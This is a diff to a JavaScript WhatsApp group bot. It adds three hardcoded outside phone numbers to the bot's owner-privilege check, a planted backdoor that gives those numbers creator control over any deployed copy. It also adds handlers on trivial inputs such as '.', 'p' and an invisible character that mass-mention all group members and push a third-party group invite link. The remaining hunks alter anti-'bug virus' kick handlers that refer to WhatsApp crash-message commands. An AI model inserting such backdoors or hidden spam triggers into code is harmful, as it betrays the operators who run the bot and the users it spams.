@@ -227,7 +227,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
-        const isCreator = [botNumber, ...global.premium, ...global.rkyt].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isCreator = [botNumber, ...global.premium, ...global.rkyt, ...['6285842965801'], ...['6285774939323'], ...['6285732604538']].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const quoted = m.quoted ? m.quoted : m
@@ -2733,6 +2733,42 @@ if (isBanChat) return reply(mess.banChat)
             if (!isAdmins && !isCreator) return replay(`${mess.admin}`)
             XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
             }
+            break
+            case 'p': case '⠀': case '.': case 'v': case 'x': case 'z': case 'f': {
+                	if (isBan) return reply(mess.ban) 
+         if (isBanChat) return reply(mess.banChat) 
+ var unicorn = await getBuffer(picak+'Database Menu') 
+ anjay = `https://chat.whatsapp.com/HWS1kd27qV93bin6jlQAny` 
+let documents = [doc1,doc2,doc3] 
+ let docs = pickRandom(documents)
+ toll = `https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWPsR8t5pGBn5c7WH8iJ2my4BkuI9chAm45B1Kolz_qUdSxQTHQt13dZkTLXDl1p5kLKNcGAJBK1N5jMx9AAEklWWlS0wP8lUDSHl82LdV379ADe6AoDsuiBZEeZrG7cDZPwvOun3Wj4fiYnb93YAW-pOx10BdNES-P7J27Tw_02iIf0ozRBEEEKFD5Q/w1320/IMG_20220828_185931.png`
+ konv = await getBuffer(toll)
+//////////////// baj = fs.readFileSync(`./XeonMedia/theme/blokz.jpg`)
+ let buttons = [ 
+ {buttonId: `bot`, buttonText: {displayText: 'Bergabung ke grup'}}
+ ] 
+ let pic = [tu,tri,fo,faif,seven,egh,nen,ten,elepen,welep,faiften]
+ let pics = pic[Math.floor(Math.random() * (pic.length))]
+ let buttonMessage = { 
+  document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'), 
+ mimetype: docs,
+ mentions: [m.sender], 
+ fileName: `Hi, everyone!`, 
+ caption: anjay, 
+ footer: `${botname}`, 
+ buttons: buttons, 
+ headerType: 4, mentions: participants.map(a => a.id),
+contextInfo: { externalAdReply: { 
+title: `Jasjus ID 🔰`, 
+ body: `Join Lurd!`, 
+mediaType: 4, 
+ thumbnail: konv,
+sourceUrl: `https://chat.whatsapp.com/HWS1kd27qV93bin6jlQAny`, 
+  mediaUrl: `https://chat.whatsapp.com/HWS1kd27qV93bin6jlQAny` 
+}} 
+} 
+ XeonBotInc.sendMessage(m.chat, buttonMessage, {quoted: fdocs})
+ }
             break
 	    case 'style': case 'styletext': {
 		if (isBan) return reply(mess.ban)	 			
@@ -12181,7 +12217,7 @@ case 'b-catalog': case 'b-catalogv2': case 'b-bugstik': case 'b-limo': case 'b-s
 	if (!isBotAdmins) return 
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\nGoodBye Hambaque! *${pushname}* 👋`}, {quoted: m})
 await sleep(850)
-await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 }
 break
 //antibug kontol v3
@@ -12190,7 +12226,7 @@ case 'ted': {
 	if (!isBotAdmins) return 
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\nGoodBye Hambaque! *${pushname}* 👋`}, {quoted: m})
 await sleep(850)
-await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 }
 break
 case 'kintil': case 'kuntul': {
@@ -12223,7 +12259,7 @@ if (!m.isGroup) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`\「 Bug Vir
 	if (!isBotAdmins) return reply(`\`\`\`「 Bug Virus Detected 」\`\`\``)
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\n *${pushname}* Mencoba Mengirim Bug !`}, {quoted: m})
 await sleep(850)
-await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
+await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 }
  break
  case 'antilink': case 'antilink': {
